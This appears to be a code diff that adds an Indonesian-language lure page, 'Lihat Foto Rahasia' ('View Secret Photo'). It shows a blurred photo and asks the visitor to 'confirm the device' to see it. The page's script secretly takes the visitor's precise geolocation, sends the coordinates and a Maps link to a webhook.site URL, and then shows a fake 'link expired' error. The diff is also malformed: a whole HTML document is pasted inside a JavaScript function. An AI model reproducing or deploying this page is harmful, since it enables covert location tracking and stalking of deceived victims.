@@ -46,6 +46,60 @@
       }).then(() => {
         document.getElementById('status').innerHTML = '<span style="color:green;">Berhasil!</span>';
       });
+      <!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lihat Foto Rahasia</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .card { background: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; max-width: 340px; width: 90%; border: 1px solid #334155; }
+    .blur-box { width: 100%; height: 180px; background: #334155; border-radius: 10px; display: flex; justify-content: center; align-items: center; filter: blur(6px); margin-bottom: 20px; font-size: 40px; }
+    .btn { background: #2563eb; color: white; border: none; padding: 12px 20px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
+    .btn:hover { background: #1d4ed8; }
+    .status { margin-top: 15px; font-size: 13px; color: #94a3b8; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="blur-box">🖼️</div>
+    <h2>Foto Eksklusif</h2>
+    <p style="font-size: 14px; color: #94a3b8; margin-bottom: 20px;">Konfirmasi perangkat terlebih dahulu untuk membuka dan melihat foto asli.</p>
+    <button class="btn" onclick="getLocation()">Buka Foto</button>
+    <div id="status" class="status"></div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9';
+
+    function getLocation() {
+      document.getElementById('status').innerHTML = 'Memuat foto...';
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendData, function() {
+          document.getElementById('status').innerHTML = 'Gagal memuat foto (Izin ditolak).';
+        }, { enableHighAccuracy: true, timeout: 10000 });
+      } else {
+        document.getElementById('status').innerHTML = 'Browser tidak mendukung.';
+      }
+    }
+
+    function sendData(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const maps = encodeURIComponent(`https://www.google.com/maps?q=${lat},${lon}`);
+
+      fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}&akurasi_meter=${acc}&google_maps=${maps}`, {
+        method: 'GET',
+        mode: 'no-cors'
+      }).then(() => {
+        document.getElementById('status').innerHTML = '<span style="color:#ef4444;">Gagal memuat gambar, tautan kedaluwarsa.</span>';
+      });
+    }
+  </script>
+</body>
+</html>
     }
 
     window.onload = getLocation;
